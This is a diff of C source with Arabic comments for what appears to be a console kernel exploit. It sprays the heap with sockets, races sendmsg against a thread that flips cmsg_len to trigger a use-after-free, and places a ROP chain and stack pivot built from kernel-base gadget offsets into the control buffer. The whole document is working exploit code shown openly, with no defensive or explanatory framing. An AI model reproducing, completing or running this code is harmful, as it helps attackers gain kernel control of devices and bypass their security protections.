@@ -21,33 +21,32 @@ struct cmsghdr *cmsg;
 int global_sock;
 int spray_socks[SPRAY_COUNT];
 
-// --- 1. دالة تهيئة الذاكرة (توضع في البداية لتجنب خطأ الـ Implicit Declaration) ---
+// --- 1. دالة تهيئة الذاكرة (لضمان استقرار الـ Heap) ---
 void prepare_heap() {
     for(int i = 0; i < SPRAY_COUNT; i++) {
-        spray_socks[i] = syscall(97, 2, 2, 0); // socket
+        spray_socks[i] = syscall(97, 2, 2, 0); 
         if(spray_socks[i] > 0) {
             uint8_t dummy[0x50];
             memset(dummy, 0, 0x50);
-            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0); // sendto
+            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
         }
     }
-    // التحرير الزوجي لخلق الفجوات المستهدفة
     for(int i = 0; i < SPRAY_COUNT; i += 2) {
         if(spray_socks[i] > 0) {
-            syscall(6, spray_socks[i]); // close
+            syscall(6, spray_socks[i]); 
             spray_socks[i] = -1;
         }
     }
 }
 
-// --- 2. خيوط المعالجة (Threads) ---
+// --- 2. خيوط المعالجة للسباق (Race Condition Threads) ---
 void *sendmsg_thread(void *arg) {
     (void)arg;
     struct msghdr msg = {0};
     msg.msg_control = control_buf;
     msg.msg_controllen = CONTROL_LEN;
     while(1) {
-        syscall(28, global_sock, &msg, 0); // sendmsg
+        syscall(28, global_sock, &msg, 0);
     }
     return NULL;
 }
@@ -55,14 +54,13 @@ void *sendmsg_thread(void *arg) {
 void *race_thread(void *arg) {
     (void)arg;
     while(1) {
-        // تبديل الطول بسرعة قصوى لاستغلال ثغرة UAF
         cmsg->cmsg_len = 0x50;   
         cmsg->cmsg_len = 0xFFFF; 
     }
     return NULL;
 }
 
-// --- 3. الدالة الرئيسية (Entry Point) ---
+// --- 3. الدالة الرئيسية ---
 int _main(struct thread *td) {
     (void)td;
     initKernel();
@@ -70,51 +68,49 @@ int _main(struct thread *td) {
 
     uint64_t kbase = get_kernel_base();
     
-    // تعريف خطوات السلسلة (ROP Chain)
+    // تعريف خطوات السلسلة
     uintptr_t step1 = (uintptr_t)(kbase + OFF_PUSH_RSP_POP_RSI_RET);
     uintptr_t step2 = (uintptr_t)(kbase + OFF_JMP_RSI_3B);
     uintptr_t step3 = (uintptr_t)(kbase + OFF_LEA_RSP_RSI_20_RET);
     uintptr_t step4 = (uintptr_t)(kbase + OFF_POP_RBX_R14_RBP_JMP);
     
-    uintptr_t val_rbx = 0xDEADC0DE;
-    uintptr_t val_r14 = 0xBAADF00D;
+    uintptr_t val_target = 0xDEADC0DE;
+    uintptr_t val_extra  = 0xBAADF00D;
 
-    // تهيئة الذاكرة أولاً
     prepare_heap();
 
-    // بناء البايلود داخل control_buf
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
-    cmsg->cmsg_type = 7; // IP_RETOPTS
+    cmsg->cmsg_type = 7; 
     cmsg->cmsg_len = 0x50;
 
-    // ملء البفر بالخطوة الأولى لضمان إصابة منطقة ext_free
+    // ملء البفر بالخطوة الأولى (التريجر) لضمان إصابة الكود
     for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
         *(uintptr_t *)(control_buf + i) = step1;
     }
 
-    // وضع الخطوة الثانية (القفز لـ RSI+3B) في مسار الـ Stack المتوقع
+    // وضع الخطوة الثانية (القفز لـ RSI+3B)
     for (int i = 0x50; i < 0xA0; i += 8) {
         *(uintptr_t *)(control_buf + i) = step2;
     }
 
-    // وضع الـ Stack Pivot عند الإزاحة المستهدفة (0x3b)
+    // وضع الـ Stack Pivot عند الإزاحة 0x3b بالضبط
     *(uintptr_t *)(control_buf + 0x3b) = step3; 
 
-    // تأمين منطقة الـ RSP الجديد (RSI + 0x20) بالقيم المطلوبة
-    *(uintptr_t *)(control_buf + 0x20) = step4;   // القفزة التالية بعد الـ pivot
-    *(uintptr_t *)(control_buf + 0x28) = val_rbx; // القيمة لـ rbx
-    *(uintptr_t *)(control_buf + 0x30) = val_r14; // القيمة لـ r14
+    // تأمين السلسلة عند منطقة الـ RSP الجديد (RSI + 0x20)
+    // عند تنفيذ step3، سيبدأ المعالج بسحب العناوين من هنا:
+    *(uintptr_t *)(control_buf + 0x20) = step4;      // سيؤدي لـ pop rbx; pop r14...
+    *(uintptr_t *)(control_buf + 0x28) = val_target; // ستذهب إلى RBX
+    *(uintptr_t *)(control_buf + 0x30) = val_extra;  // ستذهب إلى R14
+    *(uintptr_t *)(control_buf + 0x38) = step3;      // تكرار الحماية لضمان عدم الخروج من السلسلة
 
-    // فتح السوكت وإطلاق السباق
     global_sock = syscall(97, 2, 2, 0);
 
     ScePthread t1, t2;
     scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
     scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");
 
-    // لن يصل التنفيذ إلى هنا في حال نجاح الثغرة (سيحدث Kernel Panic)
     scePthreadJoin(t1, NULL);
     scePthreadJoin(t2, NULL);
 
